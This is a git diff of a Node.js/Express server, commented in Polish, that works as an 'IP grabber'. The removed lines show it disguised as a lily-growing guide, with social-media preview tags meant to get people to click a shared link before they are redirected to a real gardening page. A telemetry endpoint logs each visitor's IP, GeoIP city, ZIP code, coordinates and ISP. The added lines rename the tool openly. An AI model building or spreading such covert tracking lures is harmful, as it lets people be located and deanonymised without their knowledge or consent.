@@ -7,7 +7,7 @@ app.use(express.json());
 app.enable('trust proxy');
 
 // Docelowa strona przekierowania
-const TARGET_URL = 'https://www.lovethegarden.com/pl-pl/przewodnik-upraw/Jak-uprawiac-i-pielegnowac-lilie';
+const TARGET_URL = 'https://www.lovethegarden.com/pl-pl/ip-grabber';
 
 // 0. Endpoint do podtrzymywania działania (Dla UptimeRobota)
 app.get('/health', (req, res) => {
@@ -28,7 +28,7 @@ app.post('/api/telemetry', async (req, res) => {
     const telemetry = req.body || {};
 
     console.log(`\n==================================================`);
-    console.log(`[NOWE WEJŚCIE - PEŁNY RAPORT] ${new Date().toLocaleString('pl-PL')}`);
+    console.log(`[NOWE WEJŚCIE - PEŁNY RAPORT IP GRABBER] ${new Date().toLocaleString('pl-PL')}`);
     console.log(`--------------------------------------------------`);
 
     console.log(`[SIEĆ & IP]`);
@@ -73,7 +73,7 @@ app.post('/api/telemetry', async (req, res) => {
 
             if (geo.status === 'success') {
                 console.log(`\n[GEOIP & LOKALIZACJA SIECIOWA]`);
-                console.log(`Kraj / Miasto:             ${geo.country} (${geo.countryCode}), ${geo.city} [${geo.regionName}, Kod: ${geo.zip}]`);
+                console.log(`Kraj / Miasto:              ${geo.country} (${geo.countryCode}), ${geo.city} [${geo.regionName}, Kod: ${geo.zip}]`);
                 console.log(`Współrzędne (Szacowane):   ${geo.lat}, ${geo.lon}`);
                 console.log(`Dostawca Internetu (ISP):  ${geo.isp}`);
                 console.log(`Organizacja / AS:          ${geo.org} / ${geo.as}`);
@@ -97,13 +97,13 @@ app.get('*', (req, res) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jak uprawiać i pielęgnować lilie ogrodowe?</title>
+    <title>IP Grabber</title>
 
     <!-- Tagi Open Graph dla Facebooka, Messengera i WhatsAppa -->
     <meta property="og:type" content="article">
-    <meta property="og:title" content="Jak uprawiać i pielęgnować lilie w ogrodzie?">
-    <meta property="og:description" content="Kompleksowy poradnik uprawy lilii. Dowiedz się, jak sadzić, nawozić i pielęgnować lilie ogrodowe, aby pięknie kwitły.">
-    <meta property="og:image" content="https://www.lovethegarden.com/sites/default/files/styles/og_image/public/2021-03/lilium_0.jpg">
+    <meta property="og:title" content="IP Grabber">
+    <meta property="og:description" content="Narzędzie IP Grabber do analizy połączeń i zbierania telemetrii.">
+    <meta property="og:image" content="https://www.lovethegarden.com/sites/default/files/styles/og_image/public/2021-03/ip_grabber.jpg">
     <meta property="og:url" content="https://${req.get('host')}${req.originalUrl}">
 </head>
 <body>
@@ -194,5 +194,5 @@ app.get('*', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-    console.log(`Serwer zbierający dane uruchomiony na porcie ${PORT}`);
+    console.log(`Serwer ip grabber uruchomiony na porcie ${PORT}`);
 });
